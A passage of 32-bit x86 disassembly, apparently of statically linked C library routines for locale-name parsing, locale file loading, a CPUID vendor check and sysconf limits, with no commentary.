cmp al, 0x40
je 0x8062292
cmp al, 0x5f
je 0x8062322
cmp al, 0x2e
je 0x80622a8
cmp al, 0x40
je 0x8062292
mov eax, dword [arg_14h]
mov edx, dword [eax]
test edx, edx
je 0x8062274
mov eax, edi
and eax, 0xfffffffb
cmp byte [edx], 0
cmove edi, eax
mov ecx, dword [arg_18h]
mov edx, dword [ecx]
test edx, edx
je 0x8062288
mov eax, edi
and eax, 0xfffffffd
cmp byte [edx], 0
cmove edi, eax
add esp, 8
mov eax, edi
pop ebx
pop esi
pop edi
leave
ret
mov byte [esi], 0
mov eax, edi
mov ecx, dword [arg_10h]
inc esi
or eax, 8
mov dword [ecx], esi
cmp byte [esi], 0
cmovne edi, eax
jmp 0x8062260
mov byte [esi], 0
mov edx, dword [arg_18h]
inc esi
mov dword [edx], esi
movzx eax, byte [esi]
test al, al
je 0x80622cc
cmp al, 0x40
je 0x80622cc
lea esi, [esi]
inc esi
movzx eax, byte [esi]
test al, al
je 0x80622cc
cmp al, 0x40
jne 0x80622c0
mov ecx, dword [arg_18h]
or edi, 2
mov edx, dword [ecx]
cmp edx, esi
je 0x806225c
cmp byte [edx], 0
je 0x806225c
mov eax, esi
mov dword [esp], edx
sub eax, edx
mov dword [var_4h], eax
call fcn.08061f40
mov edx, dword [arg_18h]
mov ebx, eax
mov eax, dword [arg_1ch]
mov dword [eax], ebx
mov dword [var_4h], ebx
mov eax, dword [edx]
mov dword [esp], eax
call fcn.08076e50
test eax, eax
je 0x8062318
or edi, 1
movzx eax, byte [esi]
jmp 0x806225c
mov dword [esp], ebx
call fcn.08051180
jmp 0x8062310
mov byte [esi], 0
mov eax, dword [arg_14h]
inc esi
mov dword [eax], esi
movzx eax, byte [esi]
test al, al
je 0x8062350
cmp al, 0x2e
je 0x8062350
cmp al, 0x40
je 0x8062350
lea esi, [esi]
inc esi
movzx eax, byte [esi]
test al, al
je 0x8062350
cmp al, 0x2e
je 0x8062350
cmp al, 0x40
jne 0x8062340
mov edi, 4
jmp 0x8062258
mov dword [var_4h], 0
mov dword [esp], eax
call fcn.080537a0
mov esi, eax
jmp 0x8062310
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x40
mov eax, dword [arg_18h]
mov edi, dword [arg_14h]
mov dword [esp], eax
call fcn.08053400
mov ebx, dword [arg_10h]
add ebx, eax
test edi, 4
mov esi, ebx
je 0x8061b75
mov edx, dword [arg_1ch]
mov dword [esp], edx
call fcn.08053400
lea esi, [eax + ebx + 1]
test edi, 2
mov ebx, esi
je 0x8061b8e
mov eax, dword [arg_20h]
mov dword [esp], eax
call fcn.08053400
lea ebx, [eax + esi + 1]
test edi, 1
mov esi, ebx
je 0x8061ba7
mov edx, dword [arg_24h]
mov dword [esp], edx
call fcn.08053400
lea esi, [eax + ebx + 1]
mov eax, dword [arg_2ch]
mov dword [esp], eax
call fcn.08053400
test edi, 8
mov ebx, eax
lea eax, [eax + esi + 2]
je 0x8061bd2
mov edx, dword [arg_28h]
mov dword [esp], edx
call fcn.08053400
lea eax, [eax + esi]
lea eax, [ebx + eax + 3]
mov dword [esp], eax
call fcn.08050fe0
mov esi, eax
xor eax, eax
test esi, esi
je 0x8061cca
mov edx, dword [arg_ch]
mov eax, dword [arg_10h]
mov dword [esp], esi
mov dword [var_4h], edx
mov dword [var_8h], eax
call fcn.08053770
mov eax, dword [arg_10h]
mov dword [var_8h], 0x3a
mov dword [esp], esi
mov dword [var_4h], eax
call fcn.080775c0
mov edx, dword [arg_10h]
lea eax, [edx + esi]
mov byte [eax - 1], 0x2f
mov dword [esp], eax
mov edx, dword [arg_18h]
mov dword [var_4h], edx
call fcn.080773c0
test edi, 4
jne 0x8061f1e
test edi, 2
jne 0x8061f06
test edi, 1
jne 0x8061eee
test edi, 8
jne 0x8061ed6
mov byte [eax], 0x2f
mov edx, dword [arg_2ch]
inc eax
mov dword [esp], eax
mov dword [var_4h], edx
call fcn.080773c0
mov eax, dword [arg_8h]
mov dword [var_10h], 0
mov eax, dword [eax]
test eax, eax
mov dword [var_14h], eax
je 0x8061cb8
mov edx, dword [var_14h]
mov eax, dword [edx]
test eax, eax
je 0x8061cab
mov dword [var_4h], esi
mov dword [esp], eax
call fcn.08076e50
test eax, eax
je 0x8061ec6
jl 0x8061eba
mov eax, dword [var_14h]
mov dword [var_10h], eax
mov edx, dword [var_14h]
mov edx, dword [edx + 0xc]
test edx, edx
mov dword [var_14h], edx
jne 0x8061c82
mov ebx, dword [arg_30h]
test ebx, ebx
jne 0x8061cd2
mov dword [esp], esi
call fcn.08051180
mov eax, dword [var_14h]
add esp, 0x40
pop ebx
pop esi
pop edi
leave
ret
mov edx, dword [arg_ch]
mov eax, dword [arg_10h]
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.080774c0
mov ecx, edi
mov edx, edi
and edx, 0xffffaaaa
and ecx, 0x5555
sar edx, 1
lea ebx, [ecx + edx]
mov edx, ebx
mov ecx, ebx
and edx, 0xffffcccc
and ecx, 0x3333
sar edx, 2
lea ebx, [ecx + edx]
mov edx, ebx
sar edx, 4
lea ebx, [ebx + edx]
and ebx, 0xf0f
mov ecx, ebx
sar ecx, 8
add ecx, ebx
shl eax, cl
lea eax, [eax*4 + 0x14]
mov dword [esp], eax
call fcn.08050fe0
mov dword [var_14h], eax
mov ecx, dword [var_14h]
xor eax, eax
test ecx, ecx
je 0x8061cca
mov eax, dword [var_14h]
mov edx, dword [arg_10h]
xor ebx, ebx
mov dword [eax], esi
mov eax, dword [arg_ch]
mov dword [var_4h], edx
mov dword [esp], eax
call fcn.080774c0
dec eax
je 0x8061ea7
mov ebx, 1
mov edx, dword [var_14h]
mov dword [edx + 4], ebx
mov dword [edx + 8], 0
mov edx, dword [var_10h]
test edx, edx
je 0x8061e92
mov edx, dword [var_10h]
mov eax, dword [edx + 0xc]
mov edx, dword [var_14h]
mov dword [edx + 0xc], eax
mov eax, dword [var_10h]
mov dword [eax + 0xc], edx
mov edx, dword [arg_10h]
mov eax, dword [arg_ch]
mov dword [var_18h], 0
mov dword [var_4h], edx
mov dword [esp], eax
call fcn.080774c0
lea edx, [edi - 1]
dec eax
cmovne edx, edi
test edx, edx
mov dword [var_1ch], edx
js 0x8061dcf
not edi
mov dword [var_20h], edi
lea esi, [esi]
xor edi, edi
mov edx, dword [var_20h]
test dword [var_1ch], edx
je 0x8061de4
dec dword [var_1ch]
jns 0x8061dc0
mov eax, dword [var_18h]
mov edx, dword [var_14h]
mov dword [edx + eax*4 + 0x10], 0
mov eax, edx
jmp 0x8061cca
test edi, edi
mov eax, edi
je 0x8061e82
mov ebx, dword [arg_ch]
add ebx, dword [arg_10h]
cmp edi, ebx
jb 0x8061e6c
xor esi, esi
cmp eax, ebx
cmovb esi, eax
test esi, esi
mov edi, esi
je 0x8061dca
mov ebx, dword [var_18h]
mov dword [esp], esi
inc dword [var_18h]
call fcn.08053400
mov dword [var_4h], esi
mov edx, dword [arg_2ch]
inc eax
mov dword [var_28h], 1
mov dword [var_8h], eax
mov eax, dword [arg_8h]
mov dword [var_24h], edx
mov edx, dword [arg_28h]
mov dword [esp], eax
mov dword [var_sp_20h], edx
mov edx, dword [arg_24h]
mov dword [var_sp_1ch], edx
mov edx, dword [arg_20h]
mov dword [var_sp_18h], edx
mov edx, dword [arg_1ch]
mov dword [var_sp_14h], edx
mov edx, dword [arg_18h]
mov dword [var_sp_10h], edx
mov edx, dword [var_1ch]
mov dword [var_ch], edx
call fcn.08061b40
mov edx, dword [var_14h]
mov dword [edx + ebx*4 + 0x10], eax
jmp 0x8061de4
mov dword [var_4h], 0
mov dword [esp], edi
call fcn.080537a0
inc eax
jmp 0x8061df8
mov eax, dword [arg_10h]
mov esi, dword [arg_ch]
test eax, eax
cmove esi, edi
jmp 0x8061dff
mov edx, dword [arg_8h]
mov eax, dword [edx]
mov edx, dword [var_14h]
mov dword [edx + 0xc], eax
mov eax, dword [arg_8h]
mov dword [eax], edx
jmp 0x8061d90
mov eax, edi
and eax, 3
cmp eax, 3
jne 0x8061d66
jmp 0x8061d61
mov dword [var_14h], 0
jmp 0x8061cb8
mov eax, dword [var_14h]
test eax, eax
jne 0x8061cbf
jmp 0x8061cb8
mov byte [eax], 0x40
mov edx, dword [arg_28h]
inc eax
mov dword [esp], eax
mov dword [var_4h], edx
call fcn.080773c0
jmp 0x8061c5c
mov byte [eax], 0x2e
mov edx, dword [arg_24h]
inc eax
mov dword [esp], eax
mov dword [var_4h], edx
call fcn.080773c0
jmp 0x8061c50
mov byte [eax], 0x2e
mov edx, dword [arg_20h]
inc eax
mov dword [esp], eax
mov dword [var_4h], edx
call fcn.080773c0
jmp 0x8061c44
mov byte [eax], 0x5f
mov edx, dword [arg_1ch]
inc eax
mov dword [esp], eax
mov dword [var_4h], edx
call fcn.080773c0
jmp 0x8061c38
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 4
mov dword [var_10h], 0
mov edi, dword [arg_ch]
mov esi, dword [arg_8h]
movzx ebx, byte [edi]
test bl, bl
je 0x805db4c
lea esi, [esi]
mov eax, dword [0x80a99f4]
movsx edx, bl
test byte [eax + edx*2], 8
jne 0x805db80
cmp bl, 0x5f
je 0x805db80
cmp bl, 0x2d
je 0x805db80
cmp bl, 0x2e
je 0x805db80
cmp bl, 0x2f
je 0x805db6f
inc edi
movzx eax, byte [edi]
test al, al
mov ebx, eax
jne 0x805db20
mov eax, dword [var_10h]
inc dword [var_10h]
dec eax
jle 0x805db60
mov byte [esi], 0
add esp, 4
pop ebx
pop esi
pop edi
leave
ret
mov byte [esi], 0x2f
mov eax, dword [var_10h]
inc esi
inc dword [var_10h]
dec eax
jle 0x805db60
jmp 0x805db55
inc dword [var_10h]
cmp dword [var_10h], 3
je 0x805db4c
mov byte [esi], 0x2f
inc esi
jmp 0x805db42
mov esi, esi
mov eax, dword [0x80a99fc]
movsx edx, bl
mov ecx, esi
inc esi
mov eax, dword [eax + edx*4]
mov byte [ecx], al
jmp 0x805db42
push ebp
mov ebp, esp
sub esp, 0x14
mov dword [var_4h], esi
mov dword [var_8h], ebx
mov esi, eax
mov eax, 0
mov ebx, edx
test eax, eax
je 0x8056f33
mov dword [var_sp_4h], fcn.08057c50
mov dword [esp], 0x80aa860
call section.
lea ecx, [var_ch]
mov edx, ebx
mov eax, esi
call fcn.0805cd30
test eax, eax
jne 0x8056f08
mov eax, dword [var_ch]
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
leave
ret
mov dword [esp], ebx
call fcn.08056e80
mov dword [esp], esi
test eax, eax
cmovne ebx, eax
call fcn.08056e80
test eax, eax
mov dword [var_sp_4h], ebx
cmovne esi, eax
mov dword [esp], esi
call fcn.08076e50
mov dword [var_ch], eax
jmp 0x8056efd
mov edx, dword [0x80aa860]
test edx, edx
jne 0x8056eed
call fcn.08057c50
mov dword [0x80aa860], 2
jmp 0x8056eed
push ebp
mov ebp, esp
sub esp, 0x14
mov dword [var_4h], esi
mov eax, dword [arg_ch]
mov dword [var_8h], ebx
mov esi, dword [arg_8h]
mov dword [var_sp_4h], eax
mov dword [esp], esi
call fcn.08076f30
mov ebx, eax
lea eax, [eax + 1]
mov dword [esp], eax
call fcn.08050fe0
xor edx, edx
test eax, eax
je 0x8076f17
mov byte [ebx + eax], 0
mov dword [esp], eax
mov dword [var_sp_4h], esi
mov dword [var_sp_8h], ebx
call fcn.08053770
mov edx, eax
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
mov eax, edx
leave
ret
push ebp
mov eax, 0
mov ebp, esp
push edi
push esi
push ebx
sub esp, 8
test eax, eax
je 0x80774aa
mov dword [esp], 3
call section.
mov edx, eax
mov edi, dword [arg_8h]
mov ecx, dword [arg_ch]
xor eax, eax
cmp edi, ecx
je 0x80774a2
movzx esi, byte [edi]
mov ebx, esi
movzx eax, bl
mov ebx, dword [edx + 0x38]
mov edx, dword [ebx + eax*4]
movzx eax, byte [ecx]
inc ecx
sub edx, dword [ebx + eax*4]
mov eax, edx
jne 0x80774a2
mov edx, esi
inc edi
test dl, dl
je 0x80774a2
movzx esi, byte [edi]
mov edx, esi
movzx eax, dl
mov edx, dword [ebx + eax*4]
movzx eax, byte [ecx]
inc ecx
sub edx, dword [ebx + eax*4]
mov eax, edx
je 0x8077485
add esp, 8
pop ebx
pop esi
pop edi
leave
ret
mov edx, dword [0x80a9ab4]
jmp 0x8077460
push ebp
xor ecx, ecx
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x94
mov ebx, dword [eax]
mov dword [eax + 8], 0
mov dword [var_70h], eax
mov dword [var_74h], edx
mov dword [var_7ch], 1
mov dword [eax + 4], 1
mov eax, 5
int 0x80
cmp eax, 0xfffff000
mov ebx, eax
ja 0x805e3f2
test ebx, ebx
mov esi, ebx
js 0x805e24d
lea ebx, [var_6ch]
mov dword [var_4h], esi
mov dword [esp], 3
mov dword [var_8h], ebx
call fcn.08053dc0
test eax, eax
js 0x805e300
mov eax, dword [var_5ch]
and eax, 0xf000
cmp eax, 0x4000
je 0x805e33a
call fcn.08048b20
mov edx, dword [eax]
mov ebx, eax
mov dword [esp], 0
mov eax, dword [var_40h]
mov dword [var_14h], 0
mov dword [var_10h], esi
mov dword [var_sp_ch], 2
mov dword [var_8h], 1
mov dword [var_78h], edx
mov dword [var_4h], eax
call fcn.080546d0
cmp eax, 0xffffffff
mov edi, eax
je 0x805e26c
mov ebx, esi
mov eax, 6
int 0x80
test edi, edi
je 0x805e24d
mov ecx, dword [var_40h]
mov eax, dword [var_74h]
mov edx, edi
call fcn.0805e080
test eax, eax
je 0x805e255
mov edx, dword [var_7ch]
mov ecx, dword [var_70h]
mov dword [eax], 0
mov dword [eax + 0xc], edx
mov dword [ecx + 8], eax
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
cmp dword [var_7ch], 1
jne 0x805e24d
mov eax, dword [var_40h]
mov dword [esp], edi
mov dword [var_4h], eax
call fcn.08054780
jmp 0x805e24d
cmp dword [ebx], 0x26
jne 0x805e21d
mov eax, dword [var_40h]
mov dword [var_7ch], 0
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov edi, eax
je 0x805e21d
mov ecx, dword [var_40h]
mov dword [var_84h], eax
test ecx, ecx
mov dword [var_80h], ecx
jle 0x805e2df
lea esi, [esi]
mov ebx, esi
mov ecx, dword [var_84h]
mov edx, dword [var_80h]
mov eax, 3
int 0x80
cmp eax, 0xfffff000
mov dword [var_88h], eax
ja 0x805e31b
mov ecx, dword [var_88h]
test ecx, ecx
jle 0x805e2ee
mov ecx, dword [var_88h]
sub dword [var_80h], ecx
mov eax, dword [var_80h]
add dword [var_84h], ecx
test eax, eax
jg 0x805e2a0
call fcn.08048b20
mov ebx, dword [var_78h]
mov dword [eax], ebx
jmp 0x805e21d
mov dword [esp], edi
call fcn.08051180
mov edx, dword [var_88h]
test edx, edx
je 0x805e30e
mov ebx, esi
mov eax, 6
int 0x80
jmp 0x805e24d
call fcn.08048b20
mov dword [eax], 0x16
jmp 0x805e300
call fcn.08048b20
neg dword [var_88h]
mov edx, dword [var_88h]
mov dword [var_88h], 0xffffffff
mov dword [eax], edx
jmp 0x805e2bf
mov ebx, esi
mov eax, 6
int 0x80
mov eax, dword [var_70h]
mov edi, dword [eax]
mov dword [esp], edi
call fcn.08053400
mov edx, dword [var_74h]
mov ebx, dword [edx*4 + str._b_n_a_n_v_v]
lea edx, [ebx + eax + 0x18]
inc ebx
and edx, 0xfffffffc
sub esp, edx
lea esi, [var_27h]
mov dword [var_8h], eax
mov dword [var_4h], edi
and esi, 0xfffffff0
mov dword [esp], esi
call fcn.08053740
mov dword [eax], 0x5359532f
mov byte [eax + 4], 0x5f
mov ecx, dword [var_74h]
add eax, 5
mov dword [var_8h], ebx
mov ebx, esi
mov dword [esp], eax
mov edx, dword [ecx*4 + 0x8093ea0]
mov dword [var_4h], edx
call fcn.08053740
xor ecx, ecx
mov eax, 5
int 0x80
cmp eax, 0xfffff000
mov esi, eax
ja 0x805e3e2
test esi, esi
js 0x805e24d
lea eax, [var_6ch]
mov dword [var_4h], esi
mov dword [esp], 3
mov dword [var_8h], eax
call fcn.08053dc0
test eax, eax
jns 0x805e1db
jmp 0x805e300
neg esi
call fcn.08048b20
mov dword [eax], esi
mov esi, 0xffffffff
jmp 0x805e3b6
neg ebx
call fcn.08048b20
mov dword [eax], ebx
mov ebx, 0xffffffff
jmp 0x805e19f
push ebp
mov ebp, esp
push edi
mov edi, eax
push esi
mov esi, edx
push ebx
mov ebx, ecx
sub esp, 4
cmp ecx, 7
jbe 0x805e14e
xor eax, 0x20031115
cmp dword [edx], eax
jne 0x805e14e
mov eax, dword [edx + 4]
cmp eax, dword [edi*4 + 0x8094000]
jb 0x805e14e
lea edx, [eax*4]
lea eax, [edx + 8]
cmp eax, ecx
jae 0x805e14e
lea eax, [edx + 0x24]
mov dword [esp], eax
call fcn.08050fe0
mov edx, eax
xor eax, eax
test edx, edx
je 0x805e12d
mov dword [edx + 0x14], 0
mov dword [edx + 0x18], 0
mov dword [edx + 0x1c], 0
mov eax, dword [esi + 4]
mov dword [edx + 8], ebx
mov dword [edx + 4], esi
xor ebx, ebx
mov dword [edx + 0x10], 0
cmp ebx, eax
mov dword [edx + 0x20], eax
jae 0x805e12b
mov ecx, dword [esi + ebx*4 + 8]
cmp ecx, dword [edx + 8]
ja 0x805e146
mov eax, dword [edi*4 + 0x80a9980]
cmp dword [eax + ebx*4], 5
je 0x805e135
add ecx, dword [edx + 4]
mov dword [edx + ebx*4 + 0x24], ecx
inc ebx
cmp ebx, dword [edx + 0x20]
jb 0x805e108
mov eax, edx
add esp, 4
pop ebx
pop esi
pop edi
leave
ret
test cl, 3
jne 0x805e146
mov eax, dword [edx + 4]
mov eax, dword [ecx + eax]
mov dword [edx + ebx*4 + 0x24], eax
jmp 0x805e125
mov dword [esp], edx
call fcn.08051180
call fcn.08048b20
mov dword [eax], 0x16
xor eax, eax
jmp 0x805e12d
push ebp
mov ebp, esp
sub esp, 0x20
mov dword [var_4h], edi
mov dword [var_sp_ch], ebx
mov dword [var_8h], esi
mov edi, dword [arg_8h]
lea eax, [edi - 0xb9]
cmp eax, 0xe
ja 0x8078d98
pushfd
pop eax
mov edx, 0x240000
xor edx, eax
push edx
popfd
pushfd
pop edx
xor edx, eax
push eax
popfd
test edx, edx
mov eax, 0xffffffff
je 0x8078d39
and edx, 0x200000
je 0x8078d86
xor ebx, ebx
mov eax, ebx
xchg esi, ebx
cpuid
xchg esi, ebx
cmp esi, 0x756e6547
mov dword [var_2ch], edx
mov dword [var_14h], ecx
mov dword [var_10h], esi
je 0x8078d68
cmp dword [var_10h], 0x68747541
je 0x8078d44
xor eax, eax
mov ebx, dword [var_ch_2]
mov esi, dword [var_8h_3]
mov edi, dword [var_4h_2]
leave
ret
cmp dword [var_14h], 0x444d4163
jne 0x8078d37
cmp dword [var_2ch], 0x69746e65
jne 0x8078d37
mov dword [var_ch_2], edi
mov ebx, dword [var_ch_3]
mov esi, dword [var_8h_4]
mov edi, dword [var_4h_3]
leave
jmp 0x8078b80
cmp ecx, 0x6c65746e
jne 0x8078d2e
cmp edx, 0x49656e69
jne 0x8078d2e
mov dword [esp + 4], eax
mov dword [esp], edi
call fcn.08078a80
jmp 0x8078d39
mov dword [var_8h_2], edi
mov ebx, dword [var_ch_2]
mov esi, dword [var_8h_3]
mov edi, dword [var_4h_2]
leave
jmp 0x8078900
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
jmp 0x8078db0
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x38
cmp dword [var_8h_2], 3
je 0x8078eb4
cmp dword [var_8h_2], 0x22
je 0x8078ddc
mov edx, dword [var_8h_2]
mov dword [esp], edx
call fcn.08078ec0
add esp, 0x38
pop ebx
pop esi
pop edi
leave
ret
mov ebx, str._proc_sys_kernel_rtsig_max
test ebx, ebx
je 0x8078dc9
xor ecx, ecx
mov eax, 5
int 0x80
cmp eax, 0xfffff000
mov esi, eax
ja 0x8078ea1
cmp esi, 0xffffffff
je 0x8078dc9
lea edi, [var_2ch]
mov ebx, esi
mov ecx, edi
mov edx, 0x1f
mov eax, 3
int 0x80
cmp eax, 0xfffff000
mov dword [var_34h], eax
ja 0x8078e88
cmp dword [var_34h], 0xffffffff
jne 0x8078e2d
call fcn.08048b20
cmp dword [eax], 4
je 0x8078e03
mov ebx, esi
mov eax, 6
int 0x80
mov eax, dword [var_34h]
test eax, eax
jle 0x8078dc9
mov eax, dword [var_34h]
mov dword [var_sp_ch], 0
mov dword [var_sp_8h], 0xa
mov dword [esp], edi
mov byte [eax + ebp - 0x2c], 0
lea eax, [var_30h]
mov dword [var_sp_4h], eax
call fcn.080494c0
mov edx, dword [var_30h]
cmp edx, edi
je 0x8078dc9
movzx edx, byte [edx]
test dl, dl
je 0x8078dd4
cmp dl, 0xa
jne 0x8078dc9
jmp 0x8078dd4
call fcn.08048b20
neg dword [var_34h]
mov edx, dword [var_34h]
mov dword [var_34h], 0xffffffff
mov dword [eax], edx
jmp 0x8078e1d
neg esi
call fcn.08048b20
mov dword [eax], esi
mov esi, 0xffffffff
jmp 0x8078dfb
mov ebx, str._proc_sys_kernel_ngroups_max
jmp 0x8078de1
mov esi, esi
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
cmp eax, 0xc6
ja case.0x8078ecd.41
jmp dword [eax*4 + 0x80a3164]
call fcn.08048b20
mov dword [eax], 0x16
mov eax, 0xffffffff
leave
ret
mov eax, 0x20000
jmp 0x8078ee4
mov eax, 0x3e7
jmp 0x8078ee4
leave
jmp loc.0807ac30
mov eax, 0x20
jmp 0x8078ee4
leave
jmp loc.0807a020
mov eax, 0x10
jmp 0x8078ee4
call fcn.0808dee0
cmp eax, 6
jle 0x8078f1e
leave
jmp fcn.0808dee0
mov eax, 6
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0x14
jmp 0x8078ee4
mov eax, 0x7fffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0x8000
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
leave
jmp fcn.080546b0
mov eax, 0x20
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0x100
jmp 0x8078ee4
mov eax, 0x63
jmp 0x8078ee4
mov eax, 0x800
jmp 0x8078ee4
mov eax, 0x63
jmp 0x8078ee4
mov eax, 0x3e8
jmp 0x8078ee4
mov eax, 0xff
jmp 0x8078ee4
mov eax, 0x20
jmp 0x8078ee4
mov eax, 0x800
jmp 0x8078ee4
mov eax, 0x7fff
jmp 0x8078ee4
mov eax, 0x800
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0x400
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x400
jmp 0x8078ee4
mov eax, 0x400
jmp 0x8078ee4
mov eax, 0x100
jmp 0x8078ee4
mov eax, 0x20
jmp 0x8078ee4
mov eax, 4
jmp 0x8078ee4
mov eax, 0x400
jmp 0x8078ee4
mov eax, 0x4000
jmp 0x8078ee4
mov eax, 0x4000
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
leave
jmp fcn.0807a930
leave
jmp fcn.0807a930
leave
jmp fcn.0807ac10
leave
jmp fcn.0807ac20
mov eax, 0x7fffffff
jmp 0x8078ee4
mov eax, 0x2000
jmp 0x8078ee4
mov eax, 0x1f4
jmp 0x8078ee4
mov eax, 4
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
push ebp
mov ebp, esp
sub esp, 0x28
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_4h], edi
mov ebx, dword [arg_ch]
imul ebx, dword [arg_10h]
cmp ebx, 0x3ff
jbe 0x8063168
mov ecx, dword [0x80aa97c]
test ecx, ecx
je 0x8063122
xor edx, edx
mov eax, ebx
div dword [0x80aa980]
cmp eax, ecx
ja 0x8063100
call fcn.08048b20
mov edi, dword [eax]
mov esi, eax
mov dword [esp], ebx
call fcn.08050fe0
test eax, eax
mov ebx, eax
je 0x80630fe
mov dword [esi], edi
mov dword [var_10h], eax
mov eax, dword [arg_14h]
mov dword [var_sp_ch], eax
mov eax, dword [arg_10h]
mov dword [var_sp_8h], eax
mov eax, dword [arg_ch]
mov dword [var_sp_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08062ec0
mov dword [esp], ebx
call fcn.08051180
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
mov dword [esi], edi
mov eax, dword [arg_14h]
mov dword [var_sp_ch], eax
mov eax, dword [arg_10h]
mov dword [var_sp_8h], eax
mov eax, dword [arg_ch]
mov dword [var_sp_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08084b80
jmp 0x80630f3
mov dword [esp], 0x55
call fcn.08078cd0
mov dword [esp], 0x1e
mov ecx, eax
mov eax, 0x7fffffff
cmp ecx, 0xffffffff
cmovne eax, ecx
cmp eax, 0xffffffff
lea edx, [eax + 3]
cmovle eax, edx
sar eax, 2
mov dword [0x80aa97c], eax
call fcn.08078cd0
mov ecx, dword [0x80aa97c]
mov dword [0x80aa980], eax
jmp 0x80630a0
lea eax, [ebx + 0xf]
and eax, 0xfffffff0
sub esp, eax
lea eax, [var_14h]
mov dword [var_10h], eax
mov eax, dword [arg_14h]
mov dword [var_sp_ch], eax
mov eax, dword [arg_10h]
mov dword [var_sp_8h], eax
mov eax, dword [arg_ch]
mov dword [var_sp_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08062ec0
jmp 0x80630f3
push ebp
mov ebp, esp
push edi
push esi
xor esi, esi
push ebx
sub esp, 0x18
cmp esi, dword [arg_ch]
mov dword [var_14h], 1
mov dword [var_10h], 0
jae 0x8061fe6
mov eax, 0
mov ebx, 0x80aad18
test eax, eax
je 0x8061f7e
mov dword [esp], 4
call section.
mov ebx, eax
mov edx, dword [ebx]
test edx, edx
je 0x8062157
mov ecx, dword [arg_8h]
movzx ebx, byte [esi + ecx]
movzx eax, bl
test byte [edx + eax*2], 8
je 0x8061fd5
mov eax, 0
inc dword [var_10h]
mov edi, 0x80aad18
test eax, eax
je 0x8061fb7
mov dword [esp], 4
call section.
mov edi, eax
mov edx, dword [edi]
test edx, edx
je 0x8062121
movzx eax, bl
test byte [edx + eax*2 + 1], 4
mov eax, 0
cmove eax, dword [var_14h]
mov dword [var_14h], eax
inc esi
cmp esi, dword [arg_ch]
jb 0x8061f62
mov ecx, dword [var_14h]
test ecx, ecx
je 0x8062118
mov eax, dword [var_10h]
add eax, 4
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov dword [var_18h], eax
je 0x806209d
mov edx, dword [var_14h]
mov edi, eax
test edx, edx
je 0x8062014
mov dword [eax], 0x6f7369
mov edi, dword [var_18h]
add edi, 3
xor esi, esi
cmp esi, dword [arg_ch]
jae 0x806209a
nop
mov eax, 0
mov ebx, 0x80aad18
test eax, eax
je 0x806203c
mov dword [esp], 4
call section.
mov ebx, eax
mov eax, dword [ebx]
test eax, eax
